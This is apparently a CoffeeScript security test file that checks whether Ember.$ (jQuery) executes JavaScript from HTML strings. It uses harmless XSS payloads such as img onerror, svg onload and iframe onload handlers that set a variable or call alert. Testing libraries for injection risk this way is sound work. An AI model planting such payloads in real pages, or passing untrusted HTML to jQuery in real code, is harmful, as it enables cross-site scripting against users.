describe 'ember | jquery | security', ->
  payload_Js   = null
  payload_Html = null

  beforeEach ->
    payload_Js   = 'exploit=42'
    payload_Html = "<img src=aaa onerror='#{payload_Js}' />" # there must be a better way to trigger js from a jQuery selector

  it 'Ember.$ exposes direcly the jQuery object', ->
    Ember.$.assert_Is $

  it 'should execute javascript via Ember.$(...)', (done)->    

    (this['exploit'] is undefined).assert_Is_True()         # confirm value is not set

    after_Wait = ()->
      (this['exploit'] is undefined).assert_Is_False()      # confirm value is set=
      exploit.assert_Is 42                                  # if exploit value is is set and is 42, means that js executed ok
      done()

    Ember.$(payload_Html)                                   # put payload in $ skin
    setTimeout after_Wait, 10                               # wait 10 milliseconds


  it 'should execute via function parameter', (done)->
    some_Function =  (event)->
      Ember.$(event.target)

    (this['exploit'] is undefined).assert_Is_True()        # confirm value is not set

    after_Wait = ->
      (this['exploit'] is undefined).assert_Is_False()      # confirm value is set
      done()

    some_Function { target : payload_Html }

    setTimeout after_Wait, 10                              # wallaby runs with 2 ms

  xit 'should execute with svg', ->
    payload = '<svg onload=aaa=42 >'                        # trying svg/onload for the exploit
    Ember.$(payload)
    console.log aaa

  it 'should execute with window.alert overwrite', (done)->

    window.alert=(value)->
      console.log 'it worked :) '
      console.log value
      done()

    payload = '<img src=xxx onerror=alert(42) />'
    Ember.$(payload)

  xit 'should execute with <iframe onload', (done)->
    window.alert=(value)->
      console.log 'it worked :) '
      console.log value
      done()

    payload = '<iframe src="." onload="alert(42)" ></iframe>'                   
    Ember.$(payload)

